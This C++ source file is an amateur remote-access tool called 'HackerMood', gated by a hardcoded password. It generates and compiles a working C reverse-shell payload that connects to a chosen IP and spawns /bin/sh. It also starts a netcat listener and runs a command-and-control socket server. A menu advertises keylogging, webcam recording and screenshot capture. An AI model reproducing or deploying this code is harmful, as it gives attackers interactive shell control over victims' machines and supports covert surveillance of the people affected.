#include <iostream>
#include <string>
#include <fstream>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdbool.h>
#define PORT 8080
 

int login(std::string password)
{
    std::string p = "raytano13";
    if(p == password)
    {
        return 2;
    }
}
void base()
{
}

void logo()
{
    std::cout<<""<<std::endl;
    std::cout<<"\t\t _                _               __  __                 _ "<<std::endl;
    std::cout<<"\t\t| |__   __ _  ___| | _____ _ __  |  \\/  | ___   ___   __| |"<<std::endl;
    std::cout<<"\t\t| '_ \\ / _` |/ __| |/ / _ \\ '__| | |\\/| |/ _ \\ / _ \\ / _` |"<<std::endl;
    std::cout<<"\t\t| | | | (_| | (__|   <  __/ |    | |  | | (_) | (_) | (_| |"<<std::endl;
    std::cout<<"\t\t|_| |_|\\__,_|\\___|_|\\_\\___|_|    |_|  |_|\\___/ \\___/ \\__,_|"<<std::endl;  
    std::cout<<""<<std::endl;
}
void logo1()
{
    system("clear");
    std::cout<<""<<std::endl;
    std::cout<<"\t\t _____             _                _"<<std::endl;
    std::cout<<"\t\t|_   _| __ _   _  | |__   __ _  ___| | __"<<std::endl;
    std::cout<<"\t\t  | || '__| | | | | '_ \\ / _` |/ __| |/ /"<<std::endl;
    std::cout<<"\t\t  | || |  | |_| | | | | | (_| | (__|   < "<<std::endl;
    std::cout<<"\t\t  |_||_|   \\__, | |_| |_|\\__,_|\\___|_|\\_\\ "<<std::endl;  
    std::cout<<"\t\t           |___/                 "<<std::endl;  
    std::cout<<""<<std::endl;        

}

void Help()
{
    std::cout<<"Help for new user \n";

    std::cout<<"\t\t Command   \t\t\t Detail" <<std::endl;
    std::cout<<"\t\t  -----     \t\t\t ---- " <<std::endl;
    std::cout<<"\t\t - generate or gen \t\t to generate payload "<<std::endl;
    std::cout<<"\t\t - start \t\t\t to start server (listning) " <<std::endl;
    std::cout<<"\t\t - exit \t\t\t to exit program " <<std::endl;
    std::cout<<"\t\t - help or ? \t\t\t for helping " <<std::endl;

    std::cout<<"\nPress Enter to exit ";
    std::cin.get();
    std::cin.get();
    system("clear");

}

void time()
{
    
}

void time_generate(std::string message)
{
    std::string timer = "*";
    int rep=0;
    
    for(int i =0; i<1000000020;i++)
    {
        if(i == 1000000010)
        {
            if(rep == 0)
            {
                logo1();
                timer = timer + "*";
                std::cout<<message <<"{"<<timer <<"....}"<<std::endl;
                i=1000000;
                rep++;
            }
            else if(rep == 1)
            {
                logo1();
                timer = timer + "**";
                std::cout<<message <<"{"<<timer <<"...}"<<std::endl;
                i=1000000;
                rep++;
            }
            else if(rep == 2)
            {
                logo1();
                timer = timer + "****";
                std::cout<<message <<"{"<<timer <<".}"<<std::endl;
                i=1000000;
                rep++;
            }
            else if(rep == 3)
            {
                logo1();
                timer = timer + "*****";
                i=1000000;
                rep++;
            }
            
        }
    }
}
void time_generate_payload(std::string message)
{
    std::string timer = "*";
    int rep=0;
    
    for(int i =0; i<1000000020;i++)
    {
        if(i == 1000000010)
        {
            if(rep == 0)
            {
                logo1();
                timer = timer + "*";
                std::cout<<message <<"{"<<timer <<"....}"<<std::endl;
                i=1000000;
                rep++;
            }
            else if(rep == 1)
            {
                logo1();
                timer = timer + "**";
                std::cout<<message <<"{"<<timer <<"...}"<<std::endl;
                i=1000000;
                rep++;
            }
            else if(rep == 2)
            {
                logo1();
                timer = timer + "****";
                std::cout<<message <<"{"<<timer <<".}"<<std::endl;
                system("make");
                i=1000000;
                rep++;
            }
            else if(rep == 3)
            {
                logo1();
                timer = timer + "*****";
                std::cout<<"Generating payload {"<<timer <<"}"<<std::endl;
                system("rm payload.cpp");
                i=1000000;
                rep++;
            }
            
        }
    }
}

void starts()
{
    std::cout<<"Enter port : ";
    int po;
    std::cin >> po;
    logo1();
    time();
    std::cout<<"listning .."<< system("nc -nlp 4445");
    
} 
void basic_shell()
{
    std::cout<<"Specify IP Address : ";
    std::string ip,pay = "Generating payload";
    std::cin >> ip;
    std::cout<<"Port {Default : 4445} \n";
    std::string port = "4445";
    std::ofstream myfile;
    myfile.open ("payload.cpp");
    myfile << "#include <stdio.h> \n #include <unistd.h> \n #include <sys/socket.h> \n #include <arpa/inet.h>";
    myfile << "\n int main (int argc, char **argv) \n { \n int scktd; \n  struct sockaddr_in client;";
    myfile<<"\n client.sin_family = AF_INET; \n client.sin_addr.s_addr = inet_addr(\"" <<ip <<"\"); \n client.sin_port = htons("<<port <<");";
    myfile<<"\n scktd = socket(AF_INET,SOCK_STREAM,0); \n  connect(scktd,(struct sockaddr *)&client,sizeof(client)); \n dup2(scktd,0); \n   dup2(scktd,1);";
    myfile<<"\n dup2(scktd,2); \n  execl(\"/bin/sh\", \"sh\",\"-i\",NULL,NULL); \n   return 0; \n }";
    myfile.close();

    time_generate_payload(pay);

    std::cout<<"Paylaod generate succefully , Path : "<< "payload.cpp";
    
    std::cout<<"\nPress Enter to exit ";
    std::cin.get();
    std::cin.get();
}

void logo_custum()
{
    system("clear");
    std::cout<<"\t\t   ____          _                  _         "<<std::endl;
    std::cout<<"\t\t  / ___|   _ ___| |_ ___  _ __ ___ (_)_ __   __ _ "<<std::endl;
    std::cout<<"\t\t | |  | | | / __| __/ _ \\| '_ ` _ \\| | '_ \\ / _` |"<<std::endl;
    std::cout<<"\t\t | |__| |_| \\__ \\ || (_) | | | | | | | | | | (_| ||"<<std::endl;
    std::cout<<"\t\t  \\____\\__,_|___/\\__\\___/|_| |_| |_|_|_| |_|\\__, ||"<<std::endl;
    std::cout<<"\t\t                                             |___/ "<<std::endl;
}

void generate()
{
    basic_shell();
}

void serverDebug()
{
    std::ofstream servers;
    servers.open ("server.cpp");
    servers <<"#include <netinet/in.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <sys/socket.h>" ;
    servers<<"#include <unistd.h> #include <stdbool.h> #define PORT 8080";
    servers <<"int main(int argc, char const* argv[]){ int server_fd, new_socket, valread; struct sockaddr_in address; int opt = 1; int addrlen = sizeof(address);char buffer[1024] = { 0 };char  cmd[200];";
    servers <<"if ((server_fd = socket(AF_INET, SOCK_STREAM, 0))== 0) { perror(\"socket failed\");exit(EXIT_FAILURE);} ";
    servers <<"if (setsockopt(server_fd, SOL_SOCKET,SO_REUSEADDR | SO_REUSEPORT, &opt,sizeof(opt))) { perror(\"setsockopt\"); exit(EXIT_FAILURE);} address.sin_family = AF_INET; address.sin_addr.s_addr = INADDR_ANY;address.sin_port = htons(PORT);";
    servers <<"if (bind(server_fd, (struct sockaddr*)&address,sizeof(address))< 0) { perror(\"bind failed\"); exit(EXIT_FAILURE);}";
    servers <<"if (listen(server_fd, 3) < 0) { perror(\"listen\"); exit(EXIT_FAILURE); }";
    servers <<"if ((new_socket= accept(server_fd, (struct sockaddr*)&address,(socklen_t*)&addrlen))< 0) { perror(\"accept\"); exit(EXIT_FAILURE); }";
    servers <<"valread = read(new_socket, buffer, 1024); printf(\"%s\n\", buffer); bool t = true; char* ex = \"exit\"; while(t) { scanf(\"%s\",&cmd); send(new_socket, cmd , strlen(cmd), 0); if(strcmp(cmd, ex) == 0) { t = false; } }";
    servers << "close(new_socket); shutdown(server_fd, SHUT_RDWR); return 0; }";
    servers.close();

   
}

int Server()
{
    std::string R13 = "HackerMood";
    logo1();
    std::string Command;
    
    

	int server_fd, new_socket, valread;
	struct sockaddr_in address;
	int opt = 1;
	int addrlen = sizeof(address);
	char buffer[1024] = { 0 };
	char  cmd[200];

	// Creating socket file descriptor
	if ((server_fd = socket(AF_INET, SOCK_STREAM, 0))
		== 0) {
		perror("socket failed");
		exit(EXIT_FAILURE);
	}

	// Forcefully attaching socket to the port 8080
	if (setsockopt(server_fd, SOL_SOCKET,
				SO_REUSEADDR | SO_REUSEPORT, &opt,
				sizeof(opt))) {
		perror("setsockopt");
		exit(EXIT_FAILURE);
	}
	address.sin_family = AF_INET;
	address.sin_addr.s_addr = INADDR_ANY;
	address.sin_port = htons(PORT);

	// Forcefully attaching socket to the port 8080
	if (bind(server_fd, (struct sockaddr*)&address,
			sizeof(address))
		< 0) {
		perror("bind failed");
		exit(EXIT_FAILURE);
	}
	if (listen(server_fd, 3) < 0) {
		perror("listen");
		exit(EXIT_FAILURE);
	}
	if ((new_socket
		= accept(server_fd, (struct sockaddr*)&address,
				(socklen_t*)&addrlen))
		< 0) {
		perror("accept");
		exit(EXIT_FAILURE);
	}
	valread = read(new_socket, buffer, 1024);
	printf("Response From payload [ %s ]\n", buffer);
    bool t = true;
    char* ex = "exit";
	while(t)
    {
        std::cout<<"\t\t {" << R13 <<"} >> ";
        scanf("%s",&cmd);
        send(new_socket, cmd , strlen(cmd), 0);
        if(strcmp(cmd, ex) == 0)
        {
            t = false;
        }
        else if(strcmp(cmd,"shell") == 0)
        {
            starts();
        }
    }
	

// closing the connected socket
	close(new_socket);
// closing the listening socket
	shutdown(server_fd, SHUT_RDWR);
	return 0;


}






void custom()
{
   std::string R13 = "Choose through ID ";
   bool t = true;
    
   while(t)
   {
       logo_custum();
       std::cout<<"\n\t\tselect ability you want put into your payload and press 99 to exit : "<<std::endl;
       std::cout<<"\t\t\t ---------------------------------------------------"<<std::endl;
       for(int i=0; i<4;i++)
       {
           std::cout<<"\n\t\t ID \t\t Name \t\t\t Command  \t\t Detail" <<std::endl;
           std::cout<<"\t\t -- \t\t ---  \t\t\t  ----- \t\t -----"<<std::endl;
           std::cout<<"\t\t 1 \t\t keylogger \t\t keylog \t\t this fonction can help you to record the keyboard "<<std::endl;
           std::cout<<"\t\t 2 \t\t Cam_record \t\t Cam \t\t\t this fonction can help you to record the Camera"<<std::endl;
           std::cout<<"\t\t 3 \t\t screenshot \t\t capt \t\t\t this fonction can help you to screenshot the Desktop"<<std::endl;
           std::cout<<"\n \t \t \t \t \t \t \t  [99 - Exit ]"<<std::endl;
           int selection[4];
           std::cout<<"\n\t {" << R13 <<"} >> ";
           std::cin >> selection[i];
           logo_custum();
           std::cout<<"\t You have selected {Element ID} : "<<selection[i];
           std::string pay = "Saving parameter";
           if(selection[i] == 99)
           {
               time_generate(pay);
               t = false;
               break;
           }
       }
   } 
}






void activity()
{
    std::string R13 = "HackerMood";
    
   while(true)
   {
       logo1();
       std::string Command;
       std::cout<<"\t\t {" << R13 <<"} >> ";
       std::cin >> Command;

       if(Command == "?" || Command == "help" || Command == "Help")
       {
           Help();
       }
       else if(Command == "Start" || Command == "start")
       {
           starts();
       }
       else if(Command == "gen" || Command == "generate" || Command == "Gen" || Command == "Generate")
       {
           generate();
       }
       else if(Command == "custom" || Command == "Custom")
       {
           custom();
       }
       else if(Command == "hacker" || Command == "mood")
       {
           Server();
       }

   }
}

int main()
{
   logo();
   while(true)
   {
        
        std::cout<<"Password : ";
        std::string password;
        std::cin >> password;
        int verif = login(password);
        if(verif == 2 )
        {
            system("clear");
            activity();
            break;
        }
        else
        {
            std::cout<<"Incorrect Password";
        }
   }

}            
